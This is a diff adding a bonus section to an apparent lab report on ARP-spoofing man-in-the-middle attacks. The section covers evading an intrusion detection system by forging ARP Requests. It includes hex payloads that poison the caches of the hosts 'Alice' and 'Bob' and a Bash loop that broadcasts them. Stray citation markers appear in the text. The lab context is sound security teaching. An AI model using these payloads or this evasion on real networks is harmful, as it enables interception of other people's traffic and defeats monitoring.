@@ -123,3 +123,41 @@ sudo sysctl -w net.ipv4.ip_forward=1
 Observation: Due to container/permissions restrictions in the lab environment, I was unable to enable Kernel IP Forwarding.
 
 Impact: Because forwarding was disabled, my machine acted as a traffic "black hole." Packets from Alice arrived at my interface (where tcpdump successfully captured them) but were subsequently dropped by the kernel instead of being forwarded to Bob. While this resulted in a Denial of Service (DoS) for the victims, it was sufficient to satisfy the primary objective of intercepting the secret data.
+## 4. Bonus Task: Evading Intrusion Detection
+The lab scenario introduced a hypothetical Intrusion Detection System (IDS) capable of flagging suspicious ARP Replies (specifically Gratuitous ARP packets). [cite_start]The objective was to maintain the Man-in-the-Middle position while bypassing this detection mechanism [cite: 95-97].
+
+### 4.1 Strategy: Request-Based Spoofing
+Standard IDSs often filter unsolicited ARP Replies because they are a common signature of spoofing attacks. [cite_start]However, the ARP protocol dictates that when a device receives an **ARP Request** (Opcode `0x0001`), it must update its cache with the Sender's IP and MAC address to facilitate a reply[cite: 100].
+
+By framing the spoofed packets as "questions" (Requests) rather than "answers" (Replies), the attack mimics legitimate network resolution traffic (e.g., "Who has Alice?"), forcing the victims to update their ARP tables without triggering the IDS rule against gratuitous replies.
+
+### 4.2 Implementation
+I modified the attack to use ARP Requests by changing the **Opcode** field in the raw Ethernet frames.
+
+**Payload Modifications:**
+I created two new binary payloads, `stealth_alice` and `stealth_bob`, using `hexedit`. The only difference from the previous payloads was the 8th byte (Opcode):
+* **Original Opcode:** `00 02` (ARP Reply)
+* **New Opcode:** `00 01` (ARP Request)
+
+**Hex Structure Example (Alice Payload):**
+`00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 ...`
+*(The opcode at offset 0x06-0x07 is set to `00 01`)*.
+1. stealth_alice (Trick Alice) This packet acts as a Request from "Bob" (Mallory's MAC) asking "Who has Alice?"
+
+Hex Sequence: 00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 0A 0A 31 03 02 42 0A 0A 31 02 0A 0A 31 02
+
+2. stealth_bob (Trick Bob) This packet acts as a Request from "Alice" (Mallory's MAC) asking "Who has Bob?"
+
+Hex Sequence: 00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 0A 0A 31 02 02 42 0A 0A 31 03 0A 0A 31 03
+**Execution Script (`bonus_attack.sh`):**
+A modified Bash script was used to broadcast these requests continuously:
+```bash
+#!/bin/bash
+while true; do
+    # Opcode 1 (Request) packets
+    sudo ./raw_packet eth1 02:42:0a:0a:31:02 0x0806 stealth_alice
+    sudo ./raw_packet eth1 02:42:0a:0a:31:03 0x0806 stealth_bob
+    sleep 2
+done
+
+
